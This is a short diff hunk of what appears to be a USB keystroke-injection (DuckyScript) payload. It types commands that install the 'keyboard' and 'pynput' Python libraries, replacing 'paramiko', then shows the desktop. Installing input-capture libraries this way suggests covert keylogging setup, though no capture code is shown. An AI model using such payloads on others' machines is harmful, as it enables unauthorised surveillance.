@@ -82,7 +82,7 @@ DELAY 200
 STRING pip3 install keyboard
 ENTER
 DELAY 200
-STRING pip3 install paramiko
+STRING pip3 install pynput
 ENTER
 DELAY 200
 WINDOWS d
